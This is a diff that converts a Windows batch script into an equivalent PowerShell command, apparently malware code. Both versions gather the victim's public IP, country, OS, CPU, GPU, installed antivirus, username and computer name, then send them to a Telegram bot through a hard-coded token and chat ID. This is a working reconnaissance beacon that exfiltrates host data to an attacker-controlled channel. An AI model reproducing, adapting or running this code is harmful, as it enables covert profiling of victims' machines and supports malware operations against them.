@@ -1,17 +1,14 @@
-setlocal EnableDelayedExpansion
-set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
-set "CHAT_ID=5674938532"
-
-for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%%a" & set "IP=%%b" & echo Country: !Country! & echo IP: !IP!)
-for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "Windows=%%a"
-for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU=%%a"
-for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get caption /value') do set "GPU=%%a"
-set "Antivirus="
-for /f "tokens=2 delims==" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value') do (if defined Antivirus (set "Antivirus=!Antivirus!, %%a") else (set "Antivirus=%%a"))
-if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
-set "UserName=%USERNAME%"
-set "Worker=%COMPUTERNAME%"
-set "MESSAGE=---**RUSVKVZ**---%%0AIP: !IP!%%0ACountry: !Country!%%0AWorker: !Worker!%%0AUserName: !UserName!%%0AWindows: !Windows! !Arch!%%0ACPU: !CPU!%%0AGPU: !GPU!%%0AAntivirus: !Antivirus!"
-
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
-endlocal
+powershell -Command "
+$TOKEN = '7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54';
+$CHAT_ID = '5674938532';
+$ipInfo = Invoke-RestMethod 'http://ip-api.com/csv/?fields=country,query' -UseBasicParsing;
+$country, $ip = $ipInfo -split ',';
+$windows = (Get-WmiObject -Query 'SELECT Caption FROM Win32_OperatingSystem').Caption;
+$cpu = (Get-WmiObject -Query 'SELECT Name FROM Win32_Processor').Name;
+$gpu = (Get-WmiObject -Query 'SELECT Caption FROM Win32_VideoController').Caption;
+$antivirus = (Get-WmiObject -Namespace 'root\SecurityCenter2' -Query 'SELECT displayName FROM AntiVirusProduct').displayName;
+$arch = if (Test-Path Env:ProgramFiles(x86)) {'X64'} else {'X86'};
+$username = $env:USERNAME;
+$worker = $env:COMPUTERNAME;
+$message = '---RUSVKVZ---' + [System.Environment]::NewLine + 'IP: ' + $ip + [System.Environment]::NewLine + 'Country: ' + $country + [System.Environment]::NewLine + 'Worker: ' + $worker + [System.Environment]::NewLine + 'UserName: ' + $username + [System.Environment]::NewLine + 'Windows: ' + $windows + ' ' + $arch + [System.Environment]::NewLine + 'CPU: ' + $cpu + [System.Environment]::NewLine + 'GPU: ' + $gpu + [System.Environment]::NewLine + 'Antivirus: ' + $antivirus;
+Invoke-RestMethod "https://api.telegram.org/bot$TOKEN/sendMessage" -Method POST -Body @{chat_id=$CHAT_ID; text=$message}"
